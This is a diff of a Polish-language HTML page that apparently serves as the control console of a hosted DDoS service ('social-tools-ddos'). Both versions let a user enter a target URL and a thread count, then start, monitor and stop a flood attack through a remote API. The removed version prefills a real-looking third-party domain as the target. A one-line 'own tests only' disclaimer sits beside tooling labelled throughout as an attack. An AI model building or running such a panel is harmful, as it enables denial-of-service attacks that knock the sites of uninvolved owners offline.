@@ -2,286 +2,110 @@
 <html lang="pl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Konsola - Web Attack</title>
-    <link rel="icon" href="https://github.com/M1DES1/social-tools/raw/refs/heads/main/cwel.ico" type="image/x-icon">
+    <title>Social Tool Console</title>
     <style>
-        /* Twoje style CSS (zachowane dla spójności) */
-        body { background-color: #0f0f0f; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; }
-        .header { background: #1a1a1a; padding: 15px 50px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; }
-        .nav-link { color: #aaa; text-decoration: none; margin-left: 20px; transition: 0.3s; }
-        .nav-link:hover { color: #f44336; }
-        
-        .attack-container {
-            max-width: 700px;
-            margin: 30px auto;
-            background: #1a1a1a;
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
-            border: 1px solid #333;
-        }
-        .attack-header {
-            background: linear-gradient(135deg, #d32f2f 0%, #b71c1c 100%);
-            color: white;
-            padding: 20px 25px;
-            text-align: center;
-        }
-        .attack-header h2 { margin: 0; font-size: 28px; letter-spacing: 1px; }
-        .attack-body { padding: 30px; }
-        
-        .input-group { margin-bottom: 25px; }
-        .input-group label { display: block; color: #ccc; margin-bottom: 8px; font-size: 14px; text-transform: uppercase; }
-        
-        .attack-input {
-            width: 100%;
-            padding: 15px;
-            background: #2d2d2d;
-            border: 2px solid #444;
-            color: white;
-            border-radius: 8px;
-            box-sizing: border-box;
-        }
-        
-        .threads-control {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            background: #2d2d2d;
-            padding: 10px 15px;
-            border-radius: 8px;
-        }
-        .threads-control span { color: #f44336; font-weight: bold; min-width: 40px; }
-        .threads-control input { flex: 1; cursor: pointer; }
-
-        .button-group { display: flex; gap: 15px; margin: 30px 0; }
-        .attack-btn { flex: 2; padding: 18px; background: #d32f2f; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-        .stop-btn { flex: 1; padding: 18px; background: #424242; color: white; border: none; border-radius: 8px; cursor: pointer; }
-        .attack-btn:disabled, .stop-btn:disabled { opacity: 0.4; cursor: not-allowed; }
-
-        .status-panel { background: #2d2d2d; border-radius: 8px; padding: 20px; border-left: 4px solid #f44336; margin-bottom: 20px; }
-        .status-row { display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 5px; }
-        .status-value { color: #f44336; font-family: monospace; font-weight: bold; }
-
-        .log-panel {
-            background: #000;
-            border-radius: 6px;
-            padding: 15px;
-            max-height: 180px;
-            overflow-y: auto;
-            font-family: monospace;
-            font-size: 13px;
-            color: #0f0;
-            border: 1px solid #333;
-        }
-        .server-badge {
-            background: #2d2d2d;
-            padding: 8px 15px;
-            border-radius: 20px;
-            display: inline-block;
-            margin-bottom: 15px;
-            font-size: 13px;
-        }
-        .online { border-left: 3px solid #4caf50; }
-        .offline { border-left: 3px solid #f44336; }
-        .warning-note { color: #ff8a80; font-size: 12px; text-align: center; margin-top: 15px; }
+        body { background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px; }
+        .box { border: 1px solid #00ff00; padding: 20px; max-width: 600px; margin: 0 auto; background: #111; box-shadow: 0 0 15px rgba(0,255,0,0.2); }
+        input, button { background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 10px; margin: 5px 0; width: 100%; box-sizing: border-box; }
+        button:hover { background: #00ff00; color: #000; cursor: pointer; }
+        .stats { margin-top: 20px; border-top: 1px solid #333; padding-top: 10px; }
+        #log { font-size: 12px; color: #888; margin-top: 10px; height: 100px; overflow-y: auto; border: 1px solid #222; padding: 5px; }
     </style>
 </head>
 <body>
-    <header class="header">
-        <div class="logo">
-            <h2 style="margin:0"><a href="index.html" style="color: white; text-decoration: none;">Social Tools</a></h2>
-        </div>
-        <nav class="nav" id="nav">
-            </nav>
-    </header>
 
-    <div class="attack-container">
-        <div class="attack-header">
-            <h2>⚔️ WEB ATTACK</h2>
-            <p>Narzędzie do testowania wydajności serwerów</p>
-        </div>
-        
-        <div class="attack-body">
-            <div id="serverBadge" class="server-badge offline">
-                🔴 Serwer: Łączenie...
-            </div>
+<div class="box">
+    <h2>[ SOCIAL-TOOLS CONSOLE ]</h2>
+    <div id="status">Status: Łączenie z API...</div>
+    
+    <input type="text" id="url" placeholder="https://cel-ataku.pl" value="https://">
+    <input type="number" id="threads" placeholder="Wątki (Max 50)" value="20">
+    
+    <button id="startBtn" onclick="start()">URUCHOM ATAK</button>
+    <button id="stopBtn" onclick="stop()" style="display:none;">ZATRZYMAJ</button>
 
-            <div class="input-group">
-                <label>🎯 CEL ATAKU (URL)</label>
-                <input type="text" id="targetUrl" class="attack-input" placeholder="https://example.com" value="https://zdalne.szymaniuk.com">
-            </div>
-
-            <div class="input-group">
-                <label>⚡ ILOŚĆ WĄTKÓW (1-500)</label>
-                <div class="threads-control">
-                    <span id="threadsValue">200</span>
-                    <input type="range" id="threadsSlider" min="1" max="500" value="200">
-                </div>
-            </div>
-
-            <div class="button-group">
-                <button class="attack-btn" id="startAttackBtn" onclick="startAttack()">🚀 ROZPOCZNIJ ATAK</button>
-                <button class="stop-btn" id="stopAttackBtn" onclick="stopAttack()" disabled>⏹️ STOP</button>
-            </div>
-
-            <div class="status-panel" id="statusPanel" style="display: none;">
-                <div class="status-row"><span>ID:</span> <span class="status-value" id="attackId">-</span></div>
-                <div class="status-row"><span>ZAPYTANIA:</span> <span class="status-value" id="attackRequests">0</span></div>
-                <div class="status-row"><span>CZAS:</span> <span class="status-value" id="attackTime">0s</span></div>
-                <div class="status-row"><span>RPS (Siła):</span> <span class="status-value" id="attackRps">0</span></div>
-            </div>
-
-            <div class="log-panel" id="logPanel">
-                <div>[SYSTEM] Inicjalizacja...</div>
-            </div>
-
-            <div class="warning-note">
-                ⚠️ TYLKO DO TESTÓW WŁASNYCH! Nie atakuj stron bez zgody właściciela.
-            </div>
-        </div>
+    <div class="stats" id="statsArea" style="display:none;">
+        <div>Atak ID: <span id="statId">-</span></div>
+        <div>Zapytania: <span id="statReq">0</span></div>
+        <div>Czas: <span id="statTime">0</span>s</div>
     </div>
 
-    <script>
-        // === KONFIGURACJA ===
-        const API_BASE_URL = 'https://social-tools-ddos.onrender.com';
-        const API_URL = API_BASE_URL + '/api';
+    <div id="log"></div>
+</div>
 
-        let currentAttackId = null;
-        let statusInterval = null;
+<script>
+    const API_BASE = "https://social-tools-ddos.onrender.com";
+    let currentId = null;
+    let timer = null;
 
-        // Inicjalizacja przy starcie
-        document.addEventListener('DOMContentLoaded', () => {
-            const currentUser = localStorage.getItem('currentUser') || "Gość";
-            document.getElementById('nav').innerHTML = `
-                <span style="color:#aaa">Witaj, ${currentUser}</span>
-                <a href="#" class="nav-link" onclick="logout()">Wyloguj</a>
-            `;
-            
-            checkServerStatus();
-            // Sprawdzaj status co 15 sekund
-            setInterval(checkServerStatus, 15000);
-        });
+    function addLog(msg) {
+        const log = document.getElementById('log');
+        log.innerHTML += `> ${msg}<br>`;
+        log.scrollTop = log.scrollHeight;
+    }
 
-        // Obsługa suwaka
-        const slider = document.getElementById('threadsSlider');
-        slider.oninput = function() { document.getElementById('threadsValue').innerHTML = this.value; }
+    async function checkStatus() {
+        try {
+            const r = await fetch(`${API_BASE}/api/status`);
+            if(r.ok) document.getElementById('status').innerHTML = "Status: <span style='color:lime'>ONLINE</span>";
+        } catch(e) {
+            document.getElementById('status').innerHTML = "Status: <span style='color:red'>OFFLINE (Budzenie...)</span>";
+        }
+    }
 
-        // 1. Sprawdzanie czy serwer żyje
-        async function checkServerStatus() {
-            const badge = document.getElementById('serverBadge');
-            try {
-                // Uderzamy w endpoint /api/status z Twojego Pythona
-                const res = await fetch(`${API_URL}/status`);
-                const data = await res.json();
-                
-                if (data.success || data.status === "online") {
-                    badge.className = 'server-badge online';
-                    badge.innerHTML = `🟢 Serwer: Połączony (${data.active_attacks || 0} ataków)`;
-                }
-            } catch (err) {
-                badge.className = 'server-badge offline';
-                badge.innerHTML = '🔴 Serwer: Offline / Budzenie (poczekaj 1 min)...';
+    async function start() {
+        const url = document.getElementById('url').value;
+        const thr = document.getElementById('threads').value;
+
+        addLog("Inicjowanie zapytania...");
+        
+        try {
+            const r = await fetch(`${API_BASE}/api/attack/start`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({url: url, threads: thr})
+            });
+
+            const data = await r.json();
+            if(data.success) {
+                currentId = data.attack_id;
+                document.getElementById('startBtn').style.display = 'none';
+                document.getElementById('stopBtn').style.display = 'block';
+                document.getElementById('statsArea').style.display = 'block';
+                document.getElementById('statId').innerText = currentId;
+                addLog("Atak uruchomiony pomyślnie.");
+                timer = setInterval(updateStats, 2000);
+            } else {
+                addLog("Błąd serwera: " + data.error);
             }
+        } catch(e) {
+            addLog("Błąd połączenia (CORS lub Crash). Sprawdź logi Render.");
         }
+    }
 
-        // 2. Start Ataku
-        async function startAttack() {
-            const url = document.getElementById('targetUrl').value.trim();
-            const threads = document.getElementById('threadsSlider').value;
-
-            if (!url) return addLog('❌ Błąd: Podaj URL celu!', 'error');
-
-            addLog(`🚀 Wysyłanie żądania ataku na: ${url}...`, 'warning');
-            
-            document.getElementById('startAttackBtn').disabled = true;
-
-            try {
-                const response = await fetch(`${API_URL}/attack/start`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ url: url, threads: parseInt(threads) })
-                });
-
-                const data = await response.json();
-
-                if (data.success) {
-                    currentAttackId = data.attack_id;
-                    document.getElementById('statusPanel').style.display = 'block';
-                    document.getElementById('attackId').textContent = currentAttackId;
-                    document.getElementById('stopAttackBtn').disabled = false;
-                    
-                    addLog(`✅ Atak ruszył! ID: ${currentAttackId}`, 'success');
-                    
-                    if (statusInterval) clearInterval(statusInterval);
-                    statusInterval = setInterval(updateStats, 2000);
-                } else {
-                    throw new Error(data.error || "Błąd serwera");
-                }
-            } catch (err) {
-                addLog(`❌ Błąd: ${err.message}. Sprawdź czy backend na Render działa!`, 'error');
-                document.getElementById('startAttackBtn').disabled = false;
+    async function updateStats() {
+        if(!currentId) return;
+        try {
+            const r = await fetch(`${API_BASE}/api/attack/status/${currentId}`);
+            const data = await r.json();
+            if(data.success) {
+                document.getElementById('statReq').innerText = data.requests;
+                document.getElementById('statTime').innerText = data.duration;
             }
-        }
+        } catch(e) {}
+    }
 
-        // 3. Stop Ataku
-        async function stopAttack() {
-            if (!currentAttackId) return;
-            
-            addLog('⏹️ Zatrzymywanie...', 'warning');
-            try {
-                await fetch(`${API_URL}/attack/stop/${currentAttackId}`, { method: 'POST' });
-                addLog('✅ Atak zatrzymany pomyślnie.', 'success');
-            } catch (err) {
-                addLog('⚠️ Problem z zatrzymaniem, ale serwer pewnie już ubił proces.', 'error');
-            }
-            
-            finishAttack();
-        }
+    async function stop() {
+        if(!currentId) return;
+        await fetch(`${API_BASE}/api/attack/stop/${currentId}`, {method: 'POST'});
+        clearInterval(timer);
+        addLog("Atak zatrzymany.");
+        location.reload();
+    }
 
-        function finishAttack() {
-            clearInterval(statusInterval);
-            currentAttackId = null;
-            document.getElementById('startAttackBtn').disabled = false;
-            document.getElementById('stopAttackBtn').disabled = true;
-        }
+    setInterval(checkStatus, 10000);
+    checkStatus();
+</script>
 
-        // 4. Aktualizacja statystyk w czasie rzeczywistym
-        async function updateStats() {
-            if (!currentAttackId) return;
-
-            try {
-                const res = await fetch(`${API_URL}/attack/status/${currentAttackId}`);
-                const data = await res.json();
-
-                if (data.success) {
-                    document.getElementById('attackRequests').textContent = data.requests.toLocaleString();
-                    document.getElementById('attackTime').textContent = Math.round(data.duration) + "s";
-                    document.getElementById('attackRps').textContent = Math.round(data.rps);
-
-                    if (!data.active) {
-                        addLog('ℹ️ Atak zakończył się samoczynnie.', 'info');
-                        finishAttack();
-                    }
-                }
-            } catch (err) {
-                console.log("Status update error");
-            }
-        }
-
-        function addLog(msg, type) {
-            const panel = document.getElementById('logPanel');
-            const entry = document.createElement('div');
-            const colors = { error: '#ff4444', success: '#00ff00', warning: '#ffbb33', info: '#0099ff' };
-            entry.innerHTML = `<span style="color: #666">[${new Date().toLocaleTimeString()}]</span> <span style="color: ${colors[type] || '#fff'}">${msg}</span>`;
-            panel.appendChild(entry);
-            panel.scrollTop = panel.scrollHeight;
-        }
-
-        function logout() {
-            localStorage.removeItem('currentUser');
-            window.location.reload();
-        }
-    </script>
 </body>
 </html>
